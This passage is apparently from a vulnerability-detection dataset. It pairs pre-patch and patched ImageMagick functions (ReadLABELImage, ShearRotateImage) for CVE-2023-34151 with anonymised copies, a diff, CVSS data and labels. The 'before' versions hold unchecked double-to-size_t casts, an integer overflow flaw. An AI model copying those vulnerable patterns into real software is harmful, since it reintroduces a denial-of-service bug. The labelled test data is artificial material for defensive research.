VAR_6=DestroyImageList(VAR_6);
return((Image *) NULL);
}
VAR_7=((VAR_5->gravity == VAR_22) ||
(VAR_5->gravity == VAR_23) ||
(VAR_5->gravity == VAR_24) ||
(VAR_5->gravity == VAR_25)) ? VAR_26 : VAR_13;
(void) FormatLocaleString(VAR_2,VAR_3,""%+g%+g"",
(VAR_5->direction == VAR_27 ? (double) VAR_6->columns-
(VAR_5->gravity == VAR_22 ? VAR_9.bounds.x2 : 0.0) : 
(VAR_7 != VAR_13 ? VAR_9.bounds.x1 : 0.0)),
(VAR_5->gravity == VAR_22 ? 
MagickMax(VAR_9.ascent,VAR_9.bounds.y2) : 0.0));
(void) CloneString(&VAR_5->geometry,VAR_2);
VAR_8=AnnotateImage(VAR_6,VAR_5,VAR_1);
if (VAR_0->pointsize == 0.0)
(void) FormatImageProperty(VAR_6,""label:pointsize"",""%.20g"",
VAR_5->pointsize);
VAR_5=DestroyDrawInfo(VAR_5);
if (VAR_8 == VAR_13)
{
VAR_6=DestroyImageList(VAR_6);
return((Image *) NULL);
}
return(GetFirstImageInList(VAR_6));
}",ImageMagick/3d6d98d8a2be30d74172ab43b5b8e874d2deb158/label.c/vul/before/0.json,"static Image *ReadLABELImage(const ImageInfo *image_info,
  ExceptionInfo *exception)
{
  char
    geometry[MagickPathExtent],
    *label;

  DrawInfo
    *draw_info;

  Image
    *image;

  MagickBooleanType
    left_bearing,
    status;

  TypeMetric
    metrics;

  size_t
    height,
    width;

  /*
    Initialize Image structure.
  */
  assert(image_info != (const ImageInfo *) NULL);
  assert(image_info->signature == MagickCoreSignature);
  assert(exception != (ExceptionInfo *) NULL);
  assert(exception->signature == MagickCoreSignature);
  if (IsEventLogging() != MagickFalse)
    (void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",
      image_info->filename);
  image=AcquireImage(image_info,exception);
  (void) ResetImagePage(image,""0x0+0+0"");
  if ((image->columns != 0) && (image->rows != 0))
    {
      status=SetImageExtent(image,image->columns,image->rows,exception);
      if (status == MagickFalse)
        return(DestroyImageList(image));
      (void) SetImageBackgroundColor(image,exception);
    }
  label=InterpretImageProperties((ImageInfo *) image_info,image,
    image_info->filename,exception);
  if (label == (char *) NULL)
    return(DestroyImageList(image));
  (void) SetImageProperty(image,""label"",label,exception);
  draw_info=CloneDrawInfo(image_info,(DrawInfo *) NULL);
  width=CastDoubleToUnsigned(0.5*draw_info->pointsize*strlen(label)+0.5);
  if (AcquireMagickResource(WidthResource,width) == MagickFalse)
    {
      label=DestroyString(label);
      draw_info=DestroyDrawInfo(draw_info);
      ThrowReaderException(ImageError,""WidthOrHeightExceedsLimit"");
    }
  draw_info->text=ConstantString(label);
  (void) memset(&metrics,0,sizeof(metrics));
  status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
  AdjustTypeMetricBounds(&metrics);
  if ((image->columns == 0) && (image->rows == 0))
    {
      image->columns=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
      image->rows=(size_t) floor(metrics.height+draw_info->stroke_width+0.5);
    }
  else
    if ((status != MagickFalse) && (strlen(label) > 0) &&
        (((image->columns == 0) || (image->rows == 0)) ||
         (fabs(image_info->pointsize) < MagickEpsilon)))
      {
        const char
          *option;

        double
          high,
          low;

        ssize_t
          n;

        /*
          Auto fit text into bounding box.
        */
        low=1.0;
        option=GetImageOption(image_info,""label:max-pointsize"");
        if (option != (const char*) NULL)
          {
            high=StringToDouble(option,(char**) NULL);
            if (high < 1.0)
              high=1.0;
            high+=1.0;
          }
        else
          {
            option=GetImageOption(image_info,""label:start-pointsize"");
            if (option != (const char *) NULL)
              {
                draw_info->pointsize=StringToDouble(option,(char**) NULL);
                if (draw_info->pointsize < 1.0)
                  draw_info->pointsize=1.0;
              }
            for (n=0; n < 32; n++, draw_info->pointsize*=2.0)
            {
              (void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
                metrics.bounds.x1,metrics.ascent);
              if (draw_info->gravity == UndefinedGravity)
                (void) CloneString(&draw_info->geometry,geometry);
              status=GetMultilineTypeMetrics(image,draw_info,&metrics,
                exception);
              if (status == MagickFalse)
                break;
              AdjustTypeMetricBounds(&metrics);
              width=CastDoubleToUnsigned(metrics.width+draw_info->stroke_width+0.5);
              height=CastDoubleToUnsigned(metrics.height-metrics.underline_position+
                draw_info->stroke_width+0.5);
              if ((image->columns != 0) && (image->rows != 0))
                {
                  if ((width >= image->columns) || (height >= image->rows))
                    break;
                  if ((width < image->columns) && (height < image->rows))
                    low=draw_info->pointsize;
                }
              else
                if (((image->columns != 0) && (width >= image->columns)) ||
                    ((image->rows != 0) && (height >= image->rows)))
                  break;
            }
            if (status == MagickFalse)
              {
                label=DestroyString(label);
                draw_info=DestroyDrawInfo(draw_info);
                image=DestroyImageList(image);
                return((Image *) NULL);
              }
            high=draw_info->pointsize;
          }
        while((high-low) > 0.5)
        {
          draw_info->pointsize=(low+high)/2.0;
          (void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
            metrics.bounds.x1,metrics.ascent);
          if (draw_info->gravity == UndefinedGravity)
            (void) CloneString(&draw_info->geometry,geometry);
          status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
          if (status == MagickFalse)
            break;
          AdjustTypeMetricBounds(&metrics);
          width=CastDoubleToUnsigned(metrics.width+draw_info->stroke_width+0.5);
          height=CastDoubleToUnsigned(metrics.height-metrics.underline_position+
            draw_info->stroke_width+0.5);
          if ((image->columns != 0) && (image->rows != 0))
            {
              if ((width < image->columns) && (height < image->rows))
                low=draw_info->pointsize+0.5;
              else
                high=draw_info->pointsize-0.5;
            }
          else
            if (((image->columns != 0) && (width < image->columns)) ||
                ((image->rows != 0) && (height < image->rows)))
              low=draw_info->pointsize+0.5;
            else
              high=draw_info->pointsize-0.5;
        }
        if (status != MagickFalse)
          {
            draw_info->pointsize=floor((low+high)/2.0-0.5);
            status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
            AdjustTypeMetricBounds(&metrics);
          }
      }
   label=DestroyString(label);
   if (status == MagickFalse)
     {
       draw_info=DestroyDrawInfo(draw_info);
       image=DestroyImageList(image);
       return((Image *) NULL);
     }
  if (image->columns == 0)
    image->columns=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
  if (image->columns == 0)
    image->columns=(size_t) floor(draw_info->pointsize+draw_info->stroke_width+
      0.5);
  if (image->rows == 0)
    image->rows=(size_t) floor(metrics.height+draw_info->stroke_width+0.5);
  if (image->rows == 0)
    image->rows=(size_t) floor(draw_info->pointsize+draw_info->stroke_width+
      0.5);
  status=SetImageExtent(image,image->columns,image->rows,exception);
  if (status == MagickFalse)
    {
      draw_info=DestroyDrawInfo(draw_info);
      return(DestroyImageList(image));
    }
  if (SetImageBackgroundColor(image,exception) == MagickFalse)
    {
      draw_info=DestroyDrawInfo(draw_info);
      image=DestroyImageList(image);
      return((Image *) NULL);
    }
  /*
    Draw label.
  */
  left_bearing=((draw_info->gravity == UndefinedGravity) ||
     (draw_info->gravity == NorthWestGravity) ||
     (draw_info->gravity == WestGravity) ||
     (draw_info->gravity == SouthWestGravity)) ? MagickTrue : MagickFalse;
  (void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
    (draw_info->direction == RightToLeftDirection ? (double) image->columns-
    (draw_info->gravity == UndefinedGravity ? metrics.bounds.x2 : 0.0) : 
    (left_bearing != MagickFalse ? metrics.bounds.x1 : 0.0)),
    (draw_info->gravity == UndefinedGravity ? 
    MagickMax(metrics.ascent,metrics.bounds.y2) : 0.0));
  (void) CloneString(&draw_info->geometry,geometry);
  status=AnnotateImage(image,draw_info,exception);
  if (image_info->pointsize == 0.0)
    (void) FormatImageProperty(image,""label:pointsize"",""%.20g"",
      draw_info->pointsize);
  draw_info=DestroyDrawInfo(draw_info);
  if (status == MagickFalse)
    {
      image=DestroyImageList(image);
      return((Image *) NULL);
    }
  return(GetFirstImageInList(image));
}","static Image *ReadLABELImage(const ImageInfo *VAR_0,
  ExceptionInfo *VAR_1)
{
  char
    VAR_2[VAR_3],
    *VAR_4;

  DrawInfo
    *VAR_5;

  Image
    *VAR_6;

  MagickBooleanType
    VAR_7,
    VAR_8;

  TypeMetric
    VAR_9;

  size_t
    VAR_10,
    VAR_11;

  /* COMMENT_0 */
                               
    
  assert(VAR_0 != (const ImageInfo *) NULL);
  assert(VAR_0->signature == VAR_12);
  assert(VAR_1 != (ExceptionInfo *) NULL);
  assert(VAR_1->signature == VAR_12);
  if (IsEventLogging() != VAR_13)
    (void) LogMagickEvent(VAR_14,GetMagickModule(),""%s"",
      VAR_0->filename);
  VAR_6=AcquireImage(VAR_0,VAR_1);
  (void) ResetImagePage(VAR_6,""0x0+0+0"");
  if ((VAR_6->columns != 0) && (VAR_6->rows != 0))
    {
      VAR_8=SetImageExtent(VAR_6,VAR_6->columns,VAR_6->rows,VAR_1);
      if (VAR_8 == VAR_13)
        return(DestroyImageList(VAR_6));
      (void) SetImageBackgroundColor(VAR_6,VAR_1);
    }
  VAR_4=InterpretImageProperties((ImageInfo *) VAR_0,VAR_6,
    VAR_0->filename,VAR_1);
  if (VAR_4 == (char *) NULL)
    return(DestroyImageList(VAR_6));
  (void) SetImageProperty(VAR_6,""label"",VAR_4,VAR_1);
  VAR_5=CloneDrawInfo(VAR_0,(DrawInfo *) NULL);
  VAR_11=CastDoubleToUnsigned(0.5*VAR_5->pointsize*strlen(VAR_4)+0.5);
  if (AcquireMagickResource(VAR_15,VAR_11) == VAR_13)
    {
      VAR_4=DestroyString(VAR_4);
      VAR_5=DestroyDrawInfo(VAR_5);
      ThrowReaderException(VAR_16,""WidthOrHeightExceedsLimit"");
    }
  VAR_5->text=ConstantString(VAR_4);
  (void) memset(&VAR_9,0,sizeof(VAR_9));
  VAR_8=GetMultilineTypeMetrics(VAR_6,VAR_5,&VAR_9,VAR_1);
  AdjustTypeMetricBounds(&VAR_9);
  if ((VAR_6->columns == 0) && (VAR_6->rows == 0))
    {
      VAR_6->columns=(size_t) floor(VAR_9.width+VAR_5->stroke_width+0.5);
      VAR_6->rows=(size_t) floor(VAR_9.height+VAR_5->stroke_width+0.5);
    }
  else
    if ((VAR_8 != VAR_13) && (strlen(VAR_4) > 0) &&
        (((VAR_6->columns == 0) || (VAR_6->rows == 0)) ||
         (fabs(VAR_0->pointsize) < VAR_17)))
      {
        const char
          *VAR_18;

        double
          VAR_19,
          VAR_20;

        ssize_t
          VAR_21;

        /* COMMENT_3 */
                                          
          
        VAR_20=1.0;
        VAR_18=GetImageOption(VAR_0,""label:max-pointsize"");
        if (VAR_18 != (const char*) NULL)
          {
            VAR_19=StringToDouble(VAR_18,(char**) NULL);
            if (VAR_19 < 1.0)
              VAR_19=1.0;
            VAR_19+=1.0;
          }
        else
          {
            VAR_18=GetImageOption(VAR_0,""label:start-pointsize"");
            if (VAR_18 != (const char *) NULL)
              {
                VAR_5->pointsize=StringToDouble(VAR_18,(char**) NULL);
                if (VAR_5->pointsize < 1.0)
                  VAR_5->pointsize=1.0;
              }
            for (VAR_21=0; VAR_21 < 32; VAR_21++, VAR_5->pointsize*=2.0)
            {
              (void) FormatLocaleString(VAR_2,VAR_3,""%+g%+g"",
                VAR_9.bounds.x1,VAR_9.ascent);
              if (VAR_5->gravity == VAR_22)
                (void) CloneString(&VAR_5->geometry,VAR_2);
              VAR_8=GetMultilineTypeMetrics(VAR_6,VAR_5,&VAR_9,
                VAR_1);
              if (VAR_8 == VAR_13)
                break;
              AdjustTypeMetricBounds(&VAR_9);
              VAR_11=CastDoubleToUnsigned(VAR_9.width+VAR_5->stroke_width+0.5);
              VAR_10=CastDoubleToUnsigned(VAR_9.height-VAR_9.underline_position+
                VAR_5->stroke_width+0.5);
              if ((VAR_6->columns != 0) && (VAR_6->rows != 0))
                {
                  if ((VAR_11 >= VAR_6->columns) || (VAR_10 >= VAR_6->rows))
                    break;
                  if ((VAR_11 < VAR_6->columns) && (VAR_10 < VAR_6->rows))
                    VAR_20=VAR_5->pointsize;
                }
              else
                if (((VAR_6->columns != 0) && (VAR_11 >= VAR_6->columns)) ||
                    ((VAR_6->rows != 0) && (VAR_10 >= VAR_6->rows)))
                  break;
            }
            if (VAR_8 == VAR_13)
              {
                VAR_4=DestroyString(VAR_4);
                VAR_5=DestroyDrawInfo(VAR_5);
                VAR_6=DestroyImageList(VAR_6);
                return((Image *) NULL);
              }
            VAR_19=VAR_5->pointsize;
          }
        while((VAR_19-VAR_20) > 0.5)
        {
          VAR_5->pointsize=(VAR_20+VAR_19)/2.0;
          (void) FormatLocaleString(VAR_2,VAR_3,""%+g%+g"",
            VAR_9.bounds.x1,VAR_9.ascent);
          if (VAR_5->gravity == VAR_22)
            (void) CloneString(&VAR_5->geometry,VAR_2);
          VAR_8=GetMultilineTypeMetrics(VAR_6,VAR_5,&VAR_9,VAR_1);
          if (VAR_8 == VAR_13)
            break;
          AdjustTypeMetricBounds(&VAR_9);
          VAR_11=CastDoubleToUnsigned(VAR_9.width+VAR_5->stroke_width+0.5);
          VAR_10=CastDoubleToUnsigned(VAR_9.height-VAR_9.underline_position+
            VAR_5->stroke_width+0.5);
          if ((VAR_6->columns != 0) && (VAR_6->rows != 0))
            {
              if ((VAR_11 < VAR_6->columns) && (VAR_10 < VAR_6->rows))
                VAR_20=VAR_5->pointsize+0.5;
              else
                VAR_19=VAR_5->pointsize-0.5;
            }
          else
            if (((VAR_6->columns != 0) && (VAR_11 < VAR_6->columns)) ||
                ((VAR_6->rows != 0) && (VAR_10 < VAR_6->rows)))
              VAR_20=VAR_5->pointsize+0.5;
            else
              VAR_19=VAR_5->pointsize-0.5;
        }
        if (VAR_8 != VAR_13)
          {
            VAR_5->pointsize=floor((VAR_20+VAR_19)/2.0-0.5);
            VAR_8=GetMultilineTypeMetrics(VAR_6,VAR_5,&VAR_9,VAR_1);
            AdjustTypeMetricBounds(&VAR_9);
          }
      }
   VAR_4=DestroyString(VAR_4);
   if (VAR_8 == VAR_13)
     {
       VAR_5=DestroyDrawInfo(VAR_5);
       VAR_6=DestroyImageList(VAR_6);
       return((Image *) NULL);
     }
  if (VAR_6->columns == 0)
    VAR_6->columns=(size_t) floor(VAR_9.width+VAR_5->stroke_width+0.5);
  if (VAR_6->columns == 0)
    VAR_6->columns=(size_t) floor(VAR_5->pointsize+VAR_5->stroke_width+
      0.5);
  if (VAR_6->rows == 0)
    VAR_6->rows=(size_t) floor(VAR_9.height+VAR_5->stroke_width+0.5);
  if (VAR_6->rows == 0)
    VAR_6->rows=(size_t) floor(VAR_5->pointsize+VAR_5->stroke_width+
      0.5);
  VAR_8=SetImageExtent(VAR_6,VAR_6->columns,VAR_6->rows,VAR_1);
  if (VAR_8 == VAR_13)
    {
      VAR_5=DestroyDrawInfo(VAR_5);
      return(DestroyImageList(VAR_6));
    }
  if (SetImageBackgroundColor(VAR_6,VAR_1) == VAR_13)
    {
      VAR_5=DestroyDrawInfo(VAR_5);
      VAR_6=DestroyImageList(VAR_6);
      return((Image *) NULL);
    }
  /* COMMENT_6 */
               
    
  VAR_7=((VAR_5->gravity == VAR_22) ||
     (VAR_5->gravity == VAR_23) ||
     (VAR_5->gravity == VAR_24) ||
     (VAR_5->gravity == VAR_25)) ? VAR_26 : VAR_13;
  (void) FormatLocaleString(VAR_2,VAR_3,""%+g%+g"",
    (VAR_5->direction == VAR_27 ? (double) VAR_6->columns-
    (VAR_5->gravity == VAR_22 ? VAR_9.bounds.x2 : 0.0) : 
    (VAR_7 != VAR_13 ? VAR_9.bounds.x1 : 0.0)),
    (VAR_5->gravity == VAR_22 ? 
    MagickMax(VAR_9.ascent,VAR_9.bounds.y2) : 0.0));
  (void) CloneString(&VAR_5->geometry,VAR_2);
  VAR_8=AnnotateImage(VAR_6,VAR_5,VAR_1);
  if (VAR_0->pointsize == 0.0)
    (void) FormatImageProperty(VAR_6,""label:pointsize"",""%.20g"",
      VAR_5->pointsize);
  VAR_5=DestroyDrawInfo(VAR_5);
  if (VAR_8 == VAR_13)
    {
      VAR_6=DestroyImageList(VAR_6);
      return((Image *) NULL);
    }
  return(GetFirstImageInList(VAR_6));
}",ImageMagick/3d6d98d8a2be30d74172ab43b5b8e874d2deb158/label.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -47,7 +47,7 @@
     return(DestroyImageList(image));
   (void) SetImageProperty(image,""label"",label,exception);
   draw_info=CloneDrawInfo(image_info,(DrawInfo *) NULL);
-  width=(size_t) floor(0.5*draw_info->pointsize*strlen(label)+0.5);
+  width=CastDoubleToUnsigned(0.5*draw_info->pointsize*strlen(label)+0.5);
   if (AcquireMagickResource(WidthResource,width) == MagickFalse)
     {
       label=DestroyString(label);
@@ -110,8 +110,8 @@
               if (status == MagickFalse)
                 break;
               AdjustTypeMetricBounds(&metrics);
-              width=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
-              height=(size_t) floor(metrics.height-metrics.underline_position+
+              width=CastDoubleToUnsigned(metrics.width+draw_info->stroke_width+0.5);
+              height=CastDoubleToUnsigned(metrics.height-metrics.underline_position+
                 draw_info->stroke_width+0.5);
               if ((image->columns != 0) && (image->rows != 0))
                 {
@@ -145,8 +145,8 @@
           if (status == MagickFalse)
             break;
           AdjustTypeMetricBounds(&metrics);
-          width=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
-          height=(size_t) floor(metrics.height-metrics.underline_position+
+          width=CastDoubleToUnsigned(metrics.width+draw_info->stroke_width+0.5);
+          height=CastDoubleToUnsigned(metrics.height-metrics.underline_position+
             draw_info->stroke_width+0.5);
           if ((image->columns != 0) && (image->rows != 0))
             {","{'deleted_lines': ['  width=(size_t) floor(0.5*draw_info->pointsize*strlen(label)+0.5);', '              width=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);', '              height=(size_t) floor(metrics.height-metrics.underline_position+', '          width=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);', '          height=(size_t) floor(metrics.height-metrics.underline_position+'], 'added_lines': ['  width=CastDoubleToUnsigned(0.5*draw_info->pointsize*strlen(label)+0.5);', '              width=CastDoubleToUnsigned(metrics.width+draw_info->stroke_width+0.5);', '              height=CastDoubleToUnsigned(metrics.height-metrics.underline_position+', '          width=CastDoubleToUnsigned(metrics.width+draw_info->stroke_width+0.5);', '          height=CastDoubleToUnsigned(metrics.height-metrics.underline_position+']}",True,"A vulnerability was found in ImageMagick. This security flaw ouccers as an undefined behaviors of casting double to size_t in svg, mvg and other coders (recurring bugs of CVE-2022-32546).",5.5,MEDIUM,1,valid,2023-05-18T01:06:15Z,4
CVE-2023-34151,['CWE-190'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,ImageMagick,properly cast double to size_t (https://github.com/ImageMagick/ImageMagick/issues/6341),3d6d98d8a2be30d74172ab43b5b8e874d2deb158,https://github.com/ImageMagick/ImageMagick/commit/3d6d98d8a2be30d74172ab43b5b8e874d2deb158,MagickCore/shear.c,ShearRotateImage,"MagickExport Image *ShearRotateImage(const Image *image,const double degrees,
ExceptionInfo *exception)
{
Image
*integral_image,
*rotate_image;
MagickBooleanType
status;
MagickRealType
angle;
PointInfo
shear;
RectangleInfo
border_info,
bounds;
size_t
height,
rotations,
shear_width,
width;
assert(image != (Image *) NULL);
assert(image->signature == MagickCoreSignature);
assert(exception != (ExceptionInfo *) NULL);
assert(exception->signature == MagickCoreSignature);
if (IsEventLogging() != MagickFalse)
(void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",image->filename);
angle=fmod(degrees,360.0);
if (angle < -45.0)
angle+=360.0;
for (rotations=0; angle > 45.0; rotations++)
angle-=90.0;
rotations%=4;
integral_image=IntegralRotateImage(image,rotations,exception);
if (integral_image == (Image *) NULL)
ThrowImageException(ResourceLimitError,""MemoryAllocationFailed"");
shear.x=(-tan((double) DegreesToRadians(angle)/2.0));
shear.y=sin((double) DegreesToRadians(angle));
if ((shear.x == 0.0) && (shear.y == 0.0))
return(integral_image);
if (SetImageStorageClass(integral_image,DirectClass,exception) == MagickFalse)
{
integral_image=DestroyImage(integral_image);
return(integral_image);
}
if (integral_image->alpha_trait == UndefinedPixelTrait)
(void) SetImageAlphaChannel(integral_image,OpaqueAlphaChannel,exception);
width=integral_image->columns;
height=integral_image->rows;
bounds.width=(size_t) floor(fabs((double) height*shear.x)+width+0.5);
bounds.height=(size_t) floor(fabs((double) bounds.width*shear.y)+height+0.5);
shear_width=(size_t) floor(fabs((double) bounds.height*shear.x)+
bounds.width+0.5);
bounds.x=CastDoubleToLong(floor((double) ((shear_width > bounds.width) ?
width : bounds.width-shear_width+2)/2.0+0.5));
bounds.y=CastDoubleToLong(floor(((double) bounds.height-height+2)/2.0+0.5));
integral_image->border_color=integral_image->background_color;
integral_image->compose=CopyCompositeOp;
border_info.width=(size_t) bounds.x;
border_info.height=(size_t) bounds.y;
rotate_image=BorderImage(integral_image,&border_info,image->compose,
exception);
integral_image=DestroyImage(integral_image);
if (rotate_image == (Image *) NULL)
ThrowImageException(ResourceLimitError,""MemoryAllocationFailed"");
status=XShearImage(rotate_image,shear.x,width,height,bounds.x,(ssize_t)
(rotate_image->rows-height)/2,exception);
if (status == MagickFalse)
{
rotate_image=DestroyImage(rotate_image);
return((Image *) NULL);
}
status=YShearImage(rotate_image,shear.y,bounds.width,height,(ssize_t)
(rotate_image->columns-bounds.width)/2,bounds.y,exception);
if (status == MagickFalse)
{
rotate_image=DestroyImage(rotate_image);
return((Image *) NULL);
}
status=XShearImage(rotate_image,shear.x,bounds.width,bounds.height,(ssize_t)
(rotate_image->columns-bounds.width)/2,(ssize_t) (rotate_image->rows-
bounds.height)/2,exception);
if (status == MagickFalse)
{
rotate_image=DestroyImage(rotate_image);
return((Image *) NULL);
}
status=CropToFitImage(&rotate_image,shear.x,shear.y,(MagickRealType) width,
(MagickRealType) height,MagickTrue,exception);
rotate_image->alpha_trait=image->alpha_trait;
rotate_image->compose=image->compose;
rotate_image->page.width=0;
rotate_image->page.height=0;
if (status == MagickFalse)
rotate_image=DestroyImage(rotate_image);
return(rotate_image);
}","MagickExport VAR_0 *ShearRotateImage(const Image *VAR_1,const double VAR_2,
ExceptionInfo *VAR_3)
{
Image
*VAR_4,
*VAR_5;
MagickBooleanType
VAR_6;
MagickRealType
VAR_7;
PointInfo
VAR_8;
RectangleInfo
VAR_9,
VAR_10;
size_t
VAR_11,
VAR_12,
VAR_13,
VAR_14;
assert(VAR_1 != (Image *) NULL);
assert(VAR_1->signature == VAR_15);
assert(VAR_3 != (ExceptionInfo *) NULL);
assert(VAR_3->signature == VAR_15);
if (IsEventLogging() != VAR_16)
(void) LogMagickEvent(VAR_17,GetMagickModule(),""%s"",VAR_1->filename);
VAR_7=fmod(VAR_2,360.0);
if (VAR_7 < -45.0)
VAR_7+=360.0;
for (VAR_12=0; VAR_7 > 45.0; VAR_12++)
VAR_7-=90.0;
VAR_12%=4;
VAR_4=IntegralRotateImage(VAR_1,VAR_12,VAR_3);
if (VAR_4 == (Image *) NULL)
ThrowImageException(VAR_18,""MemoryAllocationFailed"");
VAR_8.x=(-tan((double) DegreesToRadians(VAR_7)/2.0));
VAR_8.y=sin((double) DegreesToRadians(VAR_7));
if ((VAR_8.x == 0.0) && (VAR_8.y == 0.0))
return(VAR_4);
if (SetImageStorageClass(VAR_4,VAR_19,VAR_3) == VAR_16)
{
VAR_4=DestroyImage(VAR_4);
return(VAR_4);
}
if (VAR_4->alpha_trait == VAR_20)
(void) SetImageAlphaChannel(VAR_4,VAR_21,VAR_3);
VAR_14=VAR_4->columns;
VAR_11=VAR_4->rows;
VAR_10.width=(size_t) floor(fabs((double) VAR_11*VAR_8.x)+VAR_14+0.5);
VAR_10.height=(size_t) floor(fabs((double) VAR_10.width*VAR_8.y)+VAR_11+0.5);
VAR_13=(size_t) floor(fabs((double) VAR_10.height*VAR_8.x)+
VAR_10.width+0.5);
VAR_10.x=CastDoubleToLong(floor((double) ((VAR_13 > VAR_10.width) ?
VAR_14 : VAR_10.width-VAR_13+2)/2.0+0.5));
VAR_10.y=CastDoubleToLong(floor(((double) VAR_10.height-VAR_11+2)/2.0+0.5));
VAR_4->border_color=VAR_4->background_color;
VAR_4->compose=VAR_22;
VAR_9.width=(size_t) VAR_10.x;
VAR_9.height=(size_t) VAR_10.y;
VAR_5=BorderImage(VAR_4,&VAR_9,VAR_1->compose,
VAR_3);
VAR_4=DestroyImage(VAR_4);
if (VAR_5 == (Image *) NULL)
ThrowImageException(VAR_18,""MemoryAllocationFailed"");
VAR_6=XShearImage(VAR_5,VAR_8.x,VAR_14,VAR_11,VAR_10.x,(ssize_t)
(VAR_5->rows-VAR_11)/2,VAR_3);
if (VAR_6 == VAR_16)
{
VAR_5=DestroyImage(VAR_5);
return((Image *) NULL);
}
VAR_6=YShearImage(VAR_5,VAR_8.y,VAR_10.width,VAR_11,(ssize_t)
(VAR_5->columns-VAR_10.width)/2,VAR_10.y,VAR_3);
if (VAR_6 == VAR_16)
{
VAR_5=DestroyImage(VAR_5);
return((Image *) NULL);
}
VAR_6=XShearImage(VAR_5,VAR_8.x,VAR_10.width,VAR_10.height,(ssize_t)
(VAR_5->columns-VAR_10.width)/2,(ssize_t) (VAR_5->rows-
VAR_10.height)/2,VAR_3);
if (VAR_6 == VAR_16)
{
VAR_5=DestroyImage(VAR_5);
return((Image *) NULL);
}
VAR_6=CropToFitImage(&VAR_5,VAR_8.x,VAR_8.y,(MagickRealType) VAR_14,
(MagickRealType) VAR_11,VAR_23,VAR_3);
VAR_5->alpha_trait=VAR_1->alpha_trait;
VAR_5->compose=VAR_1->compose;
VAR_5->page.width=0;
VAR_5->page.height=0;
if (VAR_6 == VAR_16)
VAR_5=DestroyImage(VAR_5);
return(VAR_5);
}",,"MagickExport Image *ShearRotateImage(const Image *image,const double degrees,
  ExceptionInfo *exception)
{
  Image
    *integral_image,
    *rotate_image;

  MagickBooleanType
    status;

  MagickRealType
    angle;

  PointInfo
    shear;

  RectangleInfo
    border_info,
    bounds;

  size_t
    height,
    rotations,
    shear_width,
    width;

  /*
    Adjust rotation angle.
  */
  assert(image != (Image *) NULL);
  assert(image->signature == MagickCoreSignature);
  assert(exception != (ExceptionInfo *) NULL);
  assert(exception->signature == MagickCoreSignature);
  if (IsEventLogging() != MagickFalse)
    (void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",image->filename);
  angle=fmod(degrees,360.0);
  if (angle < -45.0)
    angle+=360.0;
  for (rotations=0; angle > 45.0; rotations++)
    angle-=90.0;
  rotations%=4;
  /*
    Calculate shear equations.
  */
  integral_image=IntegralRotateImage(image,rotations,exception);
  if (integral_image == (Image *) NULL)
    ThrowImageException(ResourceLimitError,""MemoryAllocationFailed"");
  shear.x=(-tan((double) DegreesToRadians(angle)/2.0));
  shear.y=sin((double) DegreesToRadians(angle));
  if ((shear.x == 0.0) && (shear.y == 0.0))
    return(integral_image);
  if (SetImageStorageClass(integral_image,DirectClass,exception) == MagickFalse)
    {
      integral_image=DestroyImage(integral_image);
      return(integral_image);
    }
  if (integral_image->alpha_trait == UndefinedPixelTrait)
    (void) SetImageAlphaChannel(integral_image,OpaqueAlphaChannel,exception);
  /*
    Compute maximum bounds for 3 shear operations.
  */
  width=integral_image->columns;
  height=integral_image->rows;
  bounds.width=CastDoubleToUnsigned(fabs((double) height*shear.x)+width+0.5);
  bounds.height=CastDoubleToUnsigned(fabs((double) bounds.width*shear.y)+height+0.5);
  shear_width=CastDoubleToUnsigned(fabs((double) bounds.height*shear.x)+
    bounds.width+0.5);
  bounds.x=CastDoubleToLong(floor((double) ((shear_width > bounds.width) ?
    width : bounds.width-shear_width+2)/2.0+0.5));
  bounds.y=CastDoubleToLong(floor(((double) bounds.height-height+2)/2.0+0.5));
  /*
    Surround image with a border.
  */
  integral_image->border_color=integral_image->background_color;
  integral_image->compose=CopyCompositeOp;
  border_info.width=(size_t) bounds.x;
  border_info.height=(size_t) bounds.y;
  rotate_image=BorderImage(integral_image,&border_info,image->compose,
    exception);
  integral_image=DestroyImage(integral_image);
  if (rotate_image == (Image *) NULL)
    ThrowImageException(ResourceLimitError,""MemoryAllocationFailed"");
  /*
    Rotate the image.
  */
  status=XShearImage(rotate_image,shear.x,width,height,bounds.x,(ssize_t)
    (rotate_image->rows-height)/2,exception);
  if (status == MagickFalse)
    {
      rotate_image=DestroyImage(rotate_image);
      return((Image *) NULL);
    }
  status=YShearImage(rotate_image,shear.y,bounds.width,height,(ssize_t)
    (rotate_image->columns-bounds.width)/2,bounds.y,exception);
  if (status == MagickFalse)
    {
      rotate_image=DestroyImage(rotate_image);
      return((Image *) NULL);
    }
  status=XShearImage(rotate_image,shear.x,bounds.width,bounds.height,(ssize_t)
    (rotate_image->columns-bounds.width)/2,(ssize_t) (rotate_image->rows-
    bounds.height)/2,exception);
  if (status == MagickFalse)
    {
      rotate_image=DestroyImage(rotate_image);
      return((Image *) NULL);
    }
  status=CropToFitImage(&rotate_image,shear.x,shear.y,(MagickRealType) width,
    (MagickRealType) height,MagickTrue,exception);
  rotate_image->alpha_trait=image->alpha_trait;
  rotate_image->compose=image->compose;
  rotate_image->page.width=0;
  rotate_image->page.height=0;
  if (status == MagickFalse)
    rotate_image=DestroyImage(rotate_image);
  return(rotate_image);
}","MagickExport VAR_0 *ShearRotateImage(const Image *VAR_1,const double VAR_2,
  ExceptionInfo *VAR_3)
{
  Image
    *VAR_4,
    *VAR_5;

  MagickBooleanType
    VAR_6;

  MagickRealType
    VAR_7;

  PointInfo
    VAR_8;

  RectangleInfo
    VAR_9,
    VAR_10;

  size_t
    VAR_11,
    VAR_12,
    VAR_13,
    VAR_14;

  /* COMMENT_0 */
                          
    
  assert(VAR_1 != (Image *) NULL);
